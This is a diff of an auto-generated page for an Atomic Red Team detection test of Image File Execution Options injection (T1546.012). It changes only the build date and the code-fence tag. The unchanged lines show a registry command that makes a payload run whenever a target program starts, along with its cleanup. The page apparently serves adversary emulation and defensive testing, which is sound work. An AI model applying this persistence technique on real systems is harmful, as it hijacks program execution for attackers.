@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1546.012"
 attack_technique_name: "Event Triggered Execution: Image File Execution Options Injection"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.012/T1546.012.yaml"
-build_date: "2026-04-26 14:38:40"
+build_date: "2026-04-26 17:02:13"
 executor: "command_prompt"
 aliases:
   - "fdda2626-5234-4c90-b163-60849a24c0b8"
@@ -58,13 +58,13 @@ Leverage Global Flags Settings
 
 ### Command
 
-```commandprompt
+```cmd
 REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_binary}" /v Debugger /d "#{payload_binary}"
 ```
 
 ### Cleanup
 
-```commandprompt
+```cmd
 reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_binary}" /v Debugger /f >nul 2>&1
 ```
 
